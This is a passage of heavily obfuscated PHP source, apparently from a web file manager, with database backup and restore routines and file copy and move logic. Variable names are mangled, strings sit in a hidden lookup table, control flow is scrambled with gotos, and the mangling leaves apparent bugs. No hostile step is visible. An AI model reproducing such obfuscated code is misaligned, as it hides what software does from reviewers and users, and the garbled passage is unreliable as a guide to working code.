($D”òà®Ù„[$fØ·›ƒ¸öÉ[770]] == $fØ·›ƒ¸öÉ[771]) { $D”òà®Ù„[$fØ·›ƒ¸öÉ[772]] .= $fØ·›ƒ¸öÉ[1025] . $aŞ¤¼±²ºÇ; } goto b‹à²Ş•è‡; aëŠåØ¤İ: } public function createTable($d…Ô˜‘ÕÒŞ, $Aã«ãÚº„å = null) { $EÍõõ•Ï˜ß =& $_SERVER[úÉ·öƒÑì©]; if (!IO::exist($d…Ô˜‘ÕÒŞ)) { ActionCall($EÍõõ•Ï˜ß[1026], !0, 0); show_json(LNG($EÍõõ•Ï˜ß[1027]), !1); } $Dğ¯ßóŠà… = sqlSplit(IO::getContent($d…Ô˜‘ÕÒŞ)); foreach ($Dğ¯ßóŠà… as $BÏá”‘¡ƒ) { if ($Aã«ãÚº„å) { $fÎ‚øˆÖ¼„ = stripos($BÏá”‘¡ƒ, $EÍõõ•Ï˜ß[1028]) === 0; if ($fÎ‚øˆÖ¼„) { $Aã«ãÚº„å->task[$EÍõõ•Ï˜ß[1029]] += 1; } } $this->model()->db()->execute($BÏá”‘¡ƒ); if ($Aã«ãÚº„å && $fÎ‚øˆÖ¼„) { preg_match($EÍõõ•Ï˜ß[1030], $BÏá”‘¡ƒ, $dö”¨ŞÃ’Ï); $Aã«ãÚº„å->task[$EÍõõ•Ï˜ß[1031]] = $dö”¨ŞÃ’Ï[1]; $Aã«ãÚº„å->update(1); } } $this->taskToCache($Aã«ãÚº„å); } public function insertTable($bÜœ²·²´ò, $d‰·Š‡†¬Â = null) { $f£–ºÚĞ”ª =& $_SERVER[úÉ·öƒÑì©]; $dÂ”¾™Ÿ› = $this->model()->db(); $fÕÎÙ°›¦¿ = $DÕŞÜ°³Ì° ? array($DÕŞÜ°³Ì°) : $dÂ”¾™Ÿ›->getTables(); foreach ($bÜœ²·²´ò as $C•Í§ß½) { $DÕŞÜ°³Ì° = basename($C•Í§ß½, $f£–ºÚĞ”ª[762]); if (!in_array($DÕŞÜ°³Ì°, $fÕÎÙ°›¦¿)) { continue; } if ($d‰·Š‡†¬Â) { $d‰·Š‡†¬Â->task[$f£–ºÚĞ”ª[1031]] = $DÕŞÜ°³Ì°; } if (get_filesize($C•Í§ß½) == 0) { continue; } $F¬¤ê‡’ = $this->sqlToDb($C•Í§ß½, $d‰·Š‡†¬Â); if (!$F¬¤ê‡’) { ActionCall($f£–ºÚĞ”ª[1026], !0, 0); show_json(LNG($f£–ºÚĞ”ª[1032]) . "\133{$DÕŞÜ°³Ì°}\135", !1); } } $this->taskToCache($d‰·Š‡†¬Â); } public function sqlFromDb($Fîâ‘åˆŒ, $b•¾‚® £, $Eš‡ß³ÇôÒ = null, $b†”‘ˆµšæ = null) { goto c½Â’º–ôã; añâä·àåò: $FÏ°Ñé½¸® = $dË”±ÃöÑà->getPk(); $Dƒ¥í„Ùç¬ = $dË”±ÃöÑà->getDbFields(); do { $f‰õÒææëê = array($FÏ°Ñé½¸® => array($_SERVER[úÉ·öƒÑì©][979], $A‰©Œ·ƒ¿Ñ)); $f·±§‰Ç¦ì = $dË”±ÃöÑà->where($f‰õÒææëê)->field($Dƒ¥í„Ùç¬)->order($FÏ°Ñé½¸® . $_SERVER[úÉ·öƒÑì©][1034])->limit($aæê‡“¾¶Œ)->select(); $f·±§‰Ç¦ì = !empty($f·±§‰Ç¦ì) ? $f·±§‰Ç¦ì : array(); if (!($dÁÉÍ¤ğ—´ = count($f·±§‰Ç¦ì))) { break; } $Déä‘®—“Ò = end($f·±§‰Ç¦ì); $A‰©Œ·ƒ¿Ñ = $Déä‘®—“Ò[$FÏ°Ñé½¸®]; $fœ»öÅ¨¹ = array(); foreach ($f·±§‰Ç¦ì as $eÖ—Ú¤åˆ÷) { if ($Fîâ‘åˆŒ == $_SERVER[úÉ·öƒÑì©][1035] && $eÖ—Ú¤åˆ÷[$_SERVER[úÉ·öƒÑì©][29]] == $_SERVER[úÉ·öƒÑì©][1036]) { $A¾îŞ²Ë¹æ = json_decode($eÖ—Ú¤åˆ÷[$_SERVER[úÉ·öƒÑì©][381]], !0); if ($A¾îŞ²Ë¹æ[$_SERVER[úÉ·öƒÑì©][28]] == date($_SERVER[úÉ·öƒÑì©][727]) && !$A¾îŞ²Ë¹æ[$_SERVER[úÉ·öƒÑì©][726]]) { continue; } } if ($b†”‘ˆµšæ) { $eÖ—Ú¤åˆ÷[$_SERVER[úÉ·öƒÑì©][76]] = "\173\x69\x6f\72{$b†”‘ˆµšæ}\175" . substr($eÖ—Ú¤åˆ÷[$_SERVER[úÉ·öƒÑì©][76]], strlen("\x7b\x69\157\72{$eÖ—Ú¤åˆ÷[$_SERVER[úÉ·öƒÑì©][798]]}\175")); $eÖ—Ú¤åˆ÷[$_SERVER[úÉ·öƒÑì©][798]] = $b†”‘ˆµšæ; } $fœ»öÅ¨¹[] = $_SERVER[úÉ·öƒÑì©][1037] . $this->sqlEncode($eÖ—Ú¤åˆ÷) . $_SERVER[úÉ·öƒÑì©][1038]; } $Eğ’Öè¯½ = "\111\116\123\x45\x52\124\40\111\116\124\x4f\x20\140{$Fîâ‘åˆŒ}\140\x20\50\140" . implode($_SERVER[úÉ·öƒÑì©][1039], $Dƒ¥í„Ùç¬) . $_SERVER[úÉ·öƒÑì©][1040]; fwrite($F«ššõŒ‘, $Eğ’Öè¯½ . implode($_SERVER[úÉ·öƒÑì©][1041], $fœ»öÅ¨¹) . $_SERVER[úÉ·öƒÑì©][68] . PHP_EOL); $a¤àšØˆ†ô += $dÁÉÍ¤ğ—´; if ($Eš‡ß³ÇôÒ) { $Eš‡ß³ÇôÒ->update($dÁÉÍ¤ğ—´); } } while ($aæê‡“¾¶Œ == $dÁÉÍ¤ğ—´); goto fçËÓ‚”´; fçËÓ‚”´: fclose($F«ššõŒ‘); return $a¤àšØˆ†ô; goto fŠ”£ˆÈè‘; c½Â’º–ôã: if ($Eš‡ß³ÇôÒ) { $Eš‡ß³ÇôÒ->task[$_SERVER[úÉ·öƒÑì©][1031]] = $Fîâ‘åˆŒ; } $dË”±ÃöÑà = $this->model($Fîâ‘åˆŒ); $a¤àšØˆ†ô = 0; goto CæÆ¿Œ³¹; CæÆ¿Œ³¹: $A‰©Œ·ƒ¿Ñ = 0; $aæê‡“¾¶Œ = 10000; $F«ššõŒ‘ = fopen($b•¾‚® £, $_SERVER[úÉ·öƒÑì©][1033]); goto añâä·àåò; fŠ”£ˆÈè‘: } public function sqlToDb($FİÁÖø‘ßô, $eãª¤çŠÔ = null) { goto BøŠØİ£º; eÓ‚Ú´´½: if (!empty($f­‹™±ã…)) { $dß”÷ÕäÖÎ = $D°¥¼ÔÁ‡ğ . implode($A¬•å‘½çà[47], $f­‹™±ã…); if (!$aÓò»Õ“Çë->execute($dß”÷ÕäÖÎ)) { return !1; } if ($eãª¤çŠÔ) { $eãª¤çŠÔ->update($DŞÌñ‰òĞ’); } } return !0; goto Bœ…ÄÍ®Šä; DÃ²À”Ôª§: $f­‹™±ã… = array(); $BÒ¼• ­¾ø = $this->type == $A¬•å‘½çà[9] ? 500 : 2000; $EµÚ—ô©¶ä = basename($FİÁÖø‘ßô, $A¬•å‘½çà[762]); goto D˜ä³íƒöß; d¼¡åØœÅ»: if (!$AÎ‘Ú¸Ë•ê) { return !1; } $DŞÌñ‰òĞ’ = 0; $D°¥¼ÔÁ‡ğ = $A¬•å‘½çà[33]; goto DÃ²À”Ôª§; BøŠØİ£º: $A¬•å‘½çà =& $_SERVER[úÉ·öƒÑì©]; $aÓò»Õ“Çë = $this->model()->db(); $AÎ‘Ú¸Ë•ê = @fopen($FİÁÖø‘ßô, $A¬•å‘½çà[1042]); goto d¼¡åØœÅ»; D˜ä³íƒöß: if ($EµÚ—ô©¶ä == $A¬•å‘½çà[1043]) { $BÒ¼• ­¾ø = 50; } while (!feof($AÎ‘Ú¸Ë•ê)) { $e¡˜ôğÕ‚ = trim(fgets($AÎ‘Ú¸Ë•ê)); if (!$e¡˜ôğÕ‚) { continue; } $dß”÷ÕäÖÎ = $this->sqlDecode($e¡˜ôğÕ‚, $this->type); if (stripos($dß”÷ÕäÖÎ, $A¬•å‘½çà[364]) === 0) { if (!$D°¥¼ÔÁ‡ğ) { $D°¥¼ÔÁ‡ğ = $dß”÷ÕäÖÎ . $A¬•å‘½çà[50]; } continue; } if ($eãª¤çŠÔ) { $eãª¤çŠÔ->task[$A¬•å‘½çà[1029]] += 1; } $DŞÌñ‰òĞ’++; $f­‹™±ã…[] = rtrim(rtrim(trim($dß”÷ÕäÖÎ), $A¬•å‘½çà[47]), $A¬•å‘½çà[68]); if ($DŞÌñ‰òĞ’ >= $BÒ¼• ­¾ø) { $dß”÷ÕäÖÎ = $D°¥¼ÔÁ‡ğ . implode($A¬•å‘½çà[47], $f­‹™±ã…); if (!$aÓò»Õ“Çë->execute($dß”÷ÕäÖÎ)) { return !1; } if ($eãª¤çŠÔ) { $eãª¤çŠÔ->update($DŞÌñ‰òĞ’); } $f­‹™±ã… = array(); $DŞÌñ‰òĞ’ = 0; } } fclose($AÎ‘Ú¸Ë•ê); goto eÓ‚Ú´´½; Bœ…ÄÍ®Šä: } public function dropTable($bÜˆ’õÏ°Î = null) { $aÄÊå×à¨ = $this->model()->db(); $FÄœ›™°á = $bÜˆ’õÏ°Î ? array($bÜˆ’õÏ°Î) : $aÄÊå×à¨->getTables(); if (!$FÄœ›™°á) { return; } foreach ($FÄœ›™°á as $bÜˆ’õÏ°Î) { $aÄÊå×à¨->execute("\144\162\x6f\160\x20\164\x61\x62\x6c\145\40\x69\x66\40\x65\x78\151\x73\x74\x73\40\140{$bÜˆ’õÏ°Î}\x60"); } } private function taskToCache($AåÂ‡ô¬ÒÛ = null) { $Eº“§»›éÕ =& $_SERVER[úÉ·öƒÑì©]; if (!$AåÂ‡ô¬ÒÛ) { return; } $F‹ĞƒªÒ¸¼ = array($Eº“§»›éÕ[1031] => $AåÂ‡ô¬ÒÛ->task[$Eº“§»›éÕ[1031]], $Eº“§»›éÕ[1029] => $AåÂ‡ô¬ÒÛ->task[$Eº“§»›éÕ[1029]], $Eº“§»›éÕ[1044] => $AåÂ‡ô¬ÒÛ->task[$Eº“§»›éÕ[1044]]); if ($F‹ĞƒªÒ¸¼[$Eº“§»›éÕ[1029]] == $F‹ĞƒªÒ¸¼[$Eº“§»›éÕ[1044]]) { $F‹ĞƒªÒ¸¼[$Eº“§»›éÕ[736]] = 1; } Cache::set($Eº“§»›éÕ[1045] . $AåÂ‡ô¬ÒÛ->task[$Eº“§»›éÕ[402]], $F‹ĞƒªÒ¸¼); $AåÂ‡ô¬ÒÛ->end(); } private function sqlEncode($cºÁ÷ŸÜØ) { $bÌ¨íÎÆ÷ =& $_SERVER[úÉ·öƒÑì©]; $Fà…İ”¬ó = array(); foreach ($cºÁ÷ŸÜØ as $FÀÈŠ÷¯Ô„) { if (is_array($FÀÈŠ÷¯Ô„)) { $FÀÈŠ÷¯Ô„ = json_encode_force($FÀÈŠ÷¯Ô„); } $FÀÈŠ÷¯Ô„ = addslashes($FÀÈŠ÷¯Ô„); $FÀÈŠ÷¯Ô„ = str_replace(array($bÌ¨íÎÆ÷[1046], $bÌ¨íÎÆ÷[229]), array($bÌ¨íÎÆ÷[1047], $bÌ¨íÎÆ÷[1048]), $FÀÈŠ÷¯Ô„); $Fà…İ”¬ó[] = str_replace($bÌ¨íÎÆ÷[55], $bÌ¨íÎÆ÷[1049], $FÀÈŠ÷¯Ô„); } return $bÌ¨íÎÆ÷[55] . implode($bÌ¨íÎÆ÷[1050], $Fà…İ”¬ó) . $bÌ¨íÎÆ÷[55]; } private function sqlDecode($a‚Ø°ñø÷°, $CÛ……±Â‘Ê) { $c¿ÏŒ×†÷ƒ =& $_SERVER[úÉ·öƒÑì©]; $a‚Ø°ñø÷° = str_replace(array($c¿ÏŒ×†÷ƒ[1047], $c¿ÏŒ×†÷ƒ[1048]), array($c¿ÏŒ×†÷ƒ[1046], $c¿ÏŒ×†÷ƒ[229]), $a‚Ø°ñø÷°); if ($CÛ……±Â‘Ê == $c¿ÏŒ×†÷ƒ[9]) { $a‚Ø°ñø÷° = stripslashes($a‚Ø°ñø÷°); } return $a‚Ø°ñø÷°; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($béÅ ·‹ø, $EÊÅâ¥†¼‹) { goto C®Šõç›••; C®Šõç›••: $DÆöî“²ºÌ =& $_SERVER[úÉ·öƒÑì©]; $c©ª‘Å†óÔ = $EÊÅâ¥†¼‹; $GLOBALS[$DÆöî“²ºÌ[1051]] = $DÆöî“²ºÌ[1052] . $béÅ ·‹ø; goto eåÖªøƒ…Ô; eåÖªøƒ…Ô: Hook::trigger($DÆöî“²ºÌ[1052] . $béÅ ·‹ø . $DÆöî“²ºÌ[1053], $c©ª‘Å†óÔ); $EÔŠ†ñåÏ = self::driverMake($EÊÅâ¥†¼‹[0]); if (method_exists($EÔŠ†ñåÏ, $béÅ ·‹ø)) { $eÈºõÒ¯„È = @call_user_func_array(array($EÔŠ†ñåÏ, $béÅ ·‹ø), $EÊÅâ¥†¼‹); } else { if (method_exists($EÔŠ†ñåÏ, $DÆöî“²ºÌ[1054])) { $eÈºõÒ¯„È = @call_user_func_array(array($EÔŠ†ñåÏ, $béÅ ·‹ø), $EÊÅâ¥†¼‹); } else { if (method_exists(self, $béÅ ·‹ø)) { $eÈºõÒ¯„È = @call_user_func_array(array(self, $béÅ ·‹ø), $EÊÅâ¥†¼‹); } else { $eÈºõÒ¯„È = call_user_func_array(array(parent, $béÅ ·‹ø), $EÊÅâ¥†¼‹); } } } goto dÎŒÑõê ; dÎŒÑõê : Hook::trigger($DÆöî“²ºÌ[1052] . $béÅ ·‹ø . $DÆöî“²ºÌ[1055], $c©ª‘Å†óÔ, $eÈºõÒ¯„È); return $eÈºõÒ¯„È; goto d§·…™ª›; d§·…™ª›: } public static function init($eÚëÆÉø„») { return self::driverMake($eÚëÆÉø„»); } public static function copy($aêä¸¤… í, $f¨¬ÎöÕ©‚, $FµÈ¨àëÅ× = false, $eŸ²å¬‘Ø§ = false) { return self::copyMoveStart($aêä¸¤… í, $f¨¬ÎöÕ©‚, $FµÈ¨àëÅ×, $_SERVER[úÉ·öƒÑì©][527], $eŸ²å¬‘Ø§); } public static function move($c •Å‹ğî‹, $dÉÑ¼©ó“´, $bÎ½±Ğš¨Å = false, $c¯…ÉÍË‹ = false) { return self::copyMoveStart($c •Å‹ğî‹, $dÉÑ¼©ó“´, $bÎ½±Ğš¨Å, $_SERVER[úÉ·öƒÑì©][529], $c¯…ÉÍË‹); } private static function copyMoveStart($a™…—»…„¾, $Eãò”¸–ø¹, $Eİ ©Ô¹Ô—, $bŞ”ŒØî¹Å, $Bòã½ïˆâ) { $A„÷ï«¹‰Ş =& $_SERVER[úÉ·öƒÑì©]; $aÃ¦†£†Áà = array($a™…—»…„¾, $Eãò”¸–ø¹, $Eİ ©Ô¹Ô—, $Bòã½ïˆâ); Hook::trigger($A„÷ï«¹‰Ş[1052] . $bŞ”ŒØî¹Å . $A„÷ï«¹‰Ş[1053], $aÃ¦†£†Áà); $D­óÃ¯öáÌ = self::copyMove($a™…—»…„¾, $Eãò”¸–ø¹, $Eİ ©Ô¹Ô—, $bŞ”ŒØî¹Å, $Bòã½ïˆâ); Hook::trigger($A„÷ï«¹‰Ş[1052] . $bŞ”ŒØî¹Å . $A„÷ï«¹‰Ş[1055], $aÃ¦†£†Áà, $D­óÃ¯öáÌ); return $D­óÃ¯öáÌ; } public static function saveFile($A¥å¨„ƒÂ, $bµ¨–Æ§è², $a™Å„ò± = true) { goto Däƒš»êø˜; AÊÈ¢Ò×Œ: $C³Ææ‚ÔÍ³ = self::driverMake($bµ¨–Æ§è²); $DØ±çâ¾ = !1; if ($C³Ææ‚ÔÍ³->pathParse[$DÄŠ Õåˆ[1056]]) { $f…‘áĞóˆ = $C³Ææ‚ÔÍ³->pathParse[$DÄŠ Õåˆ[1056]]; $DØ±çâ¾ = $C³Ææ‚ÔÍ³; $C³Ææ‚ÔÍ³ = self::driverMake($f…‘áĞóˆ); } goto E—Ú†ÚÁŸ; Däƒš»êø˜: $DÄŠ Õåˆ =& $_SERVER[úÉ·öƒÑì©]; $BŒöÏ¿Ñ¼ = self::info($bµ¨–Æ§è²); $CÚ‰Úù™Ñ = self::driverMake($A¥å¨„ƒÂ); goto AÊÈ¢Ò×Œ; E—Ú†ÚÁŸ: $Dœ‹ÎÌÙÅ¨ = $C³Ææ‚ÔÍ³->pathFather($bµ¨–Æ§è²); $eÆÖ£ˆï¹ö = !0; if (!$a™Å„ò± && self::driverIsSame($CÚ‰Úù™Ñ, $C³Ææ‚ÔÍ³)) { $eÆÖ£ˆï¹ö = !1; } goto dª‘³Ç£„; dª‘³Ç£„: $eˆŠÆÀã¶Æ = self::copyFile($CÚ‰Úù™Ñ, $A¥å¨„ƒÂ, $C³Ææ‚ÔÍ³, $Dœ‹ÎÌÙÅ¨, $BŒöÏ¿Ñ¼[$DÄŠ Õåˆ[28]], $eÆÖ£ˆï¹ö); if ($DØ±çâ¾) { $eˆŠÆÀã¶Æ = $DØ±çâ¾->getPathOuter($eˆŠÆÀã¶Æ); } return $eˆŠÆÀã¶Æ; goto CÛïŞ¤”Ñ; CÛïŞ¤”Ñ: } private static function copyMove($E›…ìø¡ƒß, $fËëªÎ¾”ˆ, $a‘ìÏïø´, $F³ÑˆÇ”ö, $AŸ’´Ì¨¾° = false) { goto aƒ«º¦ù–ñ; EÜ‹ä´Œ’½: $B÷ï›á…ËÆ = self::driverMake($E›…ìø¡ƒß); $cª™ÉØ¿ = self::driverMake($fËëªÎ¾”ˆ); $dÇßÑ“æ± = $F³ÑˆÇ”ö == $C¹âÅ¬æá‚[529]; goto eæ×›Ñ¢ù¨; aƒ«º¦ù–ñ: $C¹âÅ¬æá‚ =& $_SERVER[úÉ·öƒÑì©]; if (!$E›…ìø¡ƒß || $E›…ìø¡ƒß == $C¹âÅ¬æá‚[8] || !$fËëªÎ¾”ˆ) { return !1; } ignore_timeout(); goto EÜ‹ä´Œ’½; CÃ¹Ùô†Çà: $F¢¨Ä÷‚Úó = $B÷ï›á…ËÆ->isFile($E›…ìø¡ƒß); if (!$F¢¨Ä÷‚Úó && $cª™ÉØ¿->getType() == $C¹âÅ¬æá‚[734] && $B÷ï›á…ËÆ->getType() == $C¹âÅ¬æá‚[106]) { $f’…‹À½ë = $cª™ÉØ¿->copyFolderFromIO($B÷ï›á…ËÆ, $E›…ìø¡ƒß, $fËëªÎ¾”ˆ, $a‘ìÏïø´, $dÇßÑ“æ±, $AŸ’´Ì¨¾°); } else { $f’…‹À½ë = self::copyPath($B÷ï›á…ËÆ, $E›…ìø¡ƒß, $cª™ÉØ¿, $fËëªÎ¾”ˆ, $a‘ìÏïø´, $dÇßÑ“æ±, $F¢¨Ä÷‚Úó, $AŸ’´Ì¨¾°); } if ($f’…‹À½ë && $dÇßÑ“æ±) { $B÷ï›á…ËÆ->remove($E›…ìø¡ƒß); } goto dãôèÌ“˜; eæ×›Ñ¢ù¨: $f¼­²è›‡â = !1; if ($cª™ÉØ¿->pathParse[$C¹âÅ¬æá‚[1056]]) { $fËëªÎ¾”ˆ = $cª™ÉØ¿->pathParse[$C¹âÅ¬æá‚[1056]]; $f¼­²è›‡â = $cª™ÉØ¿; $cª™ÉØ¿ = self::driverMake($fËëªÎ¾”ˆ); } self::check($B÷ï›á…ËÆ, $E›…ìø¡ƒß, $cª™ÉØ¿, $fËëªÎ¾”ˆ); goto cÊšŸºŒ„; dãôèÌ“˜: if ($f¼­²è›‡â) { $f’…‹À½ë = $f¼­²è›‡â->getPathOuter($f’…‹À½ë); } return $f’…‹À½ë; goto añÏª¦Ÿµƒ; cÊšŸºŒ„: Hook::trigger($C¹âÅ¬æá‚[73], $B÷ï›á…ËÆ, $E›…ìø¡ƒß, $cª™ÉØ¿, $fËëªÎ¾”ˆ); $d¿ŞŠÏÌ¾÷ = self::driverIsSame($B÷ï›á…ËÆ, $cª™ÉØ¿); if ($d¿ŞŠÏÌ¾÷) { if ($F³ÑˆÇ”ö == $C¹âÅ¬æá‚[529] && !method_exists($cª™ÉØ¿, $C¹âÅ¬æá‚[1057]) && trim($fËëªÎ¾”ˆ, $C¹âÅ¬æá‚[8]) == trim($cª™ÉØ¿->pathFather($E›…ìø¡ƒß), $C¹âÅ¬æá‚[8])) { if ($B÷ï›á…ËÆ->pathThis($E›…ìø¡ƒß) != $AŸ’´Ì¨¾° && !$B÷ï›á…ËÆ->isTypeObject()) { return $B÷ï›á…ËÆ->rename($E›…ìø¡ƒß, $AŸ’´Ì¨¾°); } return $cª™ÉØ¿->getPathOuter($E›…ìø¡ƒß); } if (method_exists($cª™ÉØ¿, $F³ÑˆÇ”ö)) { return $cª™ÉØ¿->{$F³ÑˆÇ”ö}($E›…ìø¡ƒß, $fËëªÎ¾”ˆ, $a‘ìÏïø´); } } goto CÃ¹Ùô†Çà; añÏª¦Ÿµƒ: } private static function check($eÃ‰“ôƒíé, $f÷‹ğğ‚¿ï, $C’¤Ğ½ªæ½, &$e£¤ĞöŸò¢) { $Cˆ¹¤˜“í¢ =& $_SERVER[úÉ·öƒÑì©]; if (self::driverIsSame($eÃ‰“ôƒíé, $C’¤Ğ½ªæ½) && $eÃ‰“ôƒíé->isFolder($f÷‹ğğ‚¿ï) && $eÃ‰“ôƒíé->isParentOf($f÷‹ğğ‚¿ï, $e£¤ĞöŸò¢)) { show_json(LNG($Cˆ¹¤˜“í¢[1058]), !1); } if (!$eÃ‰“ôƒíé->exist($f÷‹ğğ‚¿ï)) { show_json(LNG($Cˆ¹¤˜“í¢[105]), !1); } } private static function copyPath($b‰„†¹ÓË, $f¯ó‘Ô¢µ­, $aŒÍ¤¥…®·, $AÑŸÏÌÚé³, $B–³ôäÄœ¶, $dİöÃä¡Ş, $cÜèùÌÀ¡, $fƒË²„°² = false) { goto B˜Òà¯òˆ¿; EéÑ÷‰“À£: $e×õ¿±ÒÂ‚ = $aŒÍ¤¥…®·->mkdir($aŒÍ¤¥…®·->getPath($F¥ùªÖ¯•µ)); $AÑŸÏÌÚé³ = $aŒÍ¤¥…®·->getPathInner($e×õ¿±ÒÂ‚); $d­¯Û•­‘ù = $b‰„†¹ÓË->listPath($f¯ó‘Ô¢µ­, !0); goto B¤ğïï®‘; FÇÄà×¥Ìë: if ($cÜèùÌÀ¡) { return self::copyFile($b‰„†¹ÓË, $f¯ó‘Ô¢µ­, $aŒÍ¤¥…®·, $AÑŸÏÌÚé³, $EóÇ©Œ¿¡ì, $dİöÃä¡Ş); } if ($B–³ôäÄœ¶ == REPEAT_RENAME_FOLDER) { $B–³ôäÄœ¶ = !1; } $F¥ùªÖ¯•µ = rtrim($AÑŸÏÌÚé³, $eùÃ¯àÀ³Ç[8]) . $eùÃ¯àÀ³Ç[8] . $EóÇ©Œ¿¡ì; goto EéÑ÷‰“À£; B˜Òà¯òˆ¿: $eùÃ¯àÀ³Ç =& $_SERVER[úÉ·öƒÑì©]; $EóÇ©Œ¿¡ì = empty($fƒË²„°²) && $fƒË²„°² !== $eùÃ¯àÀ³Ç[191] ? $b‰„†¹ÓË->pathThis($f¯ó‘Ô¢µ­) : $fƒË²„°²; if ($B–³ôäÄœ¶) { $d¥”©Õİ§Á = $aŒÍ¤¥…®·->fileNameExist($AÑŸÏÌÚé³, $EóÇ©Œ¿¡ì); $EóÇ©Œ¿¡ì = $aŒÍ¤¥…®·->fileNameAuto($AÑŸÏÌÚé³, $EóÇ©Œ¿¡ì, $B–³ôäÄœ¶, !$cÜèùÌÀ¡); $B–³ôäÄœ¶ = $d¥”©Õİ§Á ? $B–³ôäÄœ¶ : !1; } goto FÇÄà×¥Ìë; D”äÔĞ¾¼: self::copyMoveKeepInfo($b‰„†¹ÓË, $f¯ó‘Ô¢µ­, $e×õ¿±ÒÂ‚); return $e×õ¿±ÒÂ‚; goto bÎ¹º‚‡¯; B¤ğïï®‘: $d­¯Û•­‘ù = is_array($d­¯Û•­‘ù) ? $d­¯Û•­‘ù : array($eùÃ¯àÀ³Ç[74] => array(), $eùÃ¯àÀ³Ç[75] => array()); $DìºŸõˆîô = array_merge($d­¯Û•­‘ù[$eùÃ¯àÀ³Ç[74]], $d­¯Û•­‘ù[$eùÃ¯àÀ³Ç[75]]); foreach ($DìºŸõˆîô as $fÄ™Ê¤­Ã·) { $EÈŒ™Ñàİ = $fÄ™Ê¤­Ã·[$eùÃ¯àÀ³Ç[29]] == $eùÃ¯àÀ³Ç[193]; $f¯ó‘Ô¢µ­ = $b‰„†¹ÓË->getPathInner($fÄ™Ê¤­Ã·[$eùÃ¯àÀ³Ç[76]]); $Aê‘é‡±Œî = self::copyPath($b‰„†¹ÓË, $f¯ó‘Ô¢µ­, $aŒÍ¤¥…®·, $AÑŸÏÌÚé³, $B–³ôäÄœ¶, $dİöÃä¡Ş, $EÈŒ™Ñàİ); if (!$Aê‘é‡±Œî) { IO::errorTips($eùÃ¯àÀ³Ç[1059] . $f¯ó‘Ô¢µ­ . $eùÃ¯àÀ³Ç[67] . $AÑŸÏÌÚé³); } } goto D”äÔĞ¾¼; bÎ¹º‚‡¯: } private static function copyFile($A×îÌ×äÓÚ, $C™¡Ç¨ê´±, $cçËÇ…ß¼ë, $aâŸ†¯¾¦Î, $Eå÷ö¤óÓ, $CšÂì‰Éâ‡) { goto bÖ±ø‘Ë“Ï; Fñ›½í¸è: if ($GLOBALS[$A¦§¸ç†‰[6]][$A¦§¸ç†‰[88]][$A¦§¸ç†‰[776]]) { $e° Õ¦³– = $GLOBALS[$A¦§¸ç†‰[6]][$A¦§¸ç†‰[88]][$A¦§¸ç†‰[776]]; } $CšÂì‰Éâ‡ = !0; $CÊğ‚—ˆ½Ô = $e° Õ¦³–; goto aøâˆéŒ÷î; EØÙÛåÏ™Ó: self::remove($dØè÷ÅˆÈ•); Hook::trigger($A¦§¸ç†‰[1062], $A×îÌ×äÓÚ, $C™¡Ç¨ê´±, $cçËÇ…ß¼ë, $aâŸ†¯¾¦Î, $Eå÷ö¤óÓ, $B£¹š¸Ê²º); self::copyMoveKeepInfo($A×îÌ×äÓÚ, $C™¡Ç¨ê´±, $B£¹š¸Ê²º); goto e‰ÌßÏ®±·; e‰ÌßÏ®±·: return $B£¹š¸Ê²º; goto Cèî§Ü‚ÊÒ; aøâˆéŒ÷î: mk_dir($CÊğ‚—ˆ½Ô); $aĞåÔ¡Ë¿Ï = $CÊğ‚—ˆ½Ô . $FÁº‰ —‚ˆ; $dØè÷ÅˆÈ• = $aĞåÔ¡Ë¿Ï; goto cĞ³’¦—­Ï; a¬¸êÇØ”é: Hook::trigger($A¦§¸ç†‰[1061], $A×îÌ×äÓÚ, $C™¡Ç¨ê´±, $cçËÇ…ß¼ë, $aâŸ†¯¾¦Î, $Eå÷ö¤óÓ, $FÁº‰ —‚ˆ); if (self::driverIsSame($A×îÌ×äÓÚ, $cçËÇ…ß¼ë)) { if ($CšÂì‰Éâ‡) { $B£¹š¸Ê²º = $cçËÇ…ß¼ë->moveFile($C™¡Ç¨ê´±, $aâŸ†¯¾¦Î); } else { $B£¹š¸Ê²º = $cçËÇ…ß¼ë->copyFile($C™¡Ç¨ê´±, $aâŸ†¯¾¦Î); } Hook::trigger($A¦§¸ç†‰[1062], $A×îÌ×äÓÚ, $C™¡Ç¨ê´±, $cçËÇ…ß¼ë, $aâŸ†¯¾¦Î, $Eå÷ö¤óÓ, $B£¹š¸Ê²º); self::copyMoveKeepInfo($A×îÌ×äÓÚ, $C™¡Ç¨ê´±, $B£¹š¸Ê²º); return $B£¹š¸Ê²º; } $e° Õ¦³– = TEMP_FILES; goto Fñ›½í¸è; cĞ³’¦—­Ï: $aĞåÔ¡Ë¿Ï = $A×îÌ×äÓÚ->download($C™¡Ç¨ê´±, $aĞåÔ¡Ë¿Ï); $aĞåÔ¡Ë¿Ï = $A×îÌ×äÓÚ->iconvApp($aĞåÔ¡Ë¿Ï); $B£¹š¸Ê²º = $cçËÇ…ß¼ë->upload($aâŸ†¯¾¦Î, $aĞåÔ¡Ë¿Ï, $CšÂì‰Éâ‡); goto EØÙÛåÏ™Ó; bÖ±ø‘Ë“Ï: $A¦§¸ç†‰ =& $_SERVER[úÉ·öƒÑì©]; $aâŸ†¯¾¦Î = $cçËÇ…ß¼ë->getPath(rtrim($aâŸ†¯¾¦Î, $A¦§¸ç†‰[8]) . $A¦§¸ç†‰[8] . $Eå÷ö¤óÓ); $FÁº‰ —‚ˆ = $A¦§¸ç†‰[1060] . time() . rand_string(5); goto a¬¸êÇØ”é; Cèî§Ü‚ÊÒ: } private static function copyMoveKeepInfo($EöÉ•áØÃ, $DÆ»í½¾ô…, $fõâÙÛŠİ¸) { if (!$fõâÙÛŠİ¸) { return; } $e·°…ÑÛ¶ò = $EöÉ•áØÃ->info($DÆ»í½¾ô…); if (!is_array($e·°…ÑÛ¶ò)) { return; } IO::setModifyTime($fõâÙÛŠİ¸, $e·°…ÑÛ¶ò[$_SERVER[úÉ·öƒÑì©][84]]); } public static function pathFather($fëÂŠ™•æ†) { $FñõêÜÃÃè = IO::init($fëÂŠ™•æ†); $CÚŒ¬î±æ¹ = $FñõêÜÃÃè->pathFather($FñõêÜÃÃè->path); return $FñõêÜÃÃè->getPathOuter($CÚŒ¬î±æ¹); } public static function fileOut($B­Šô„Û, $BÖèÉàøØØ = false, $B­ËÂÌƒÛÊ = false, $e©Ğ™éô—‘ = '') { $c»Ä†¡…–µ = self::driverMake($B­Šô„Û); if ($c»Ä†¡…–µ->isFileOutServer()) { return $c»Ä†¡…–µ->fileOutServer($B­Šô„Û, 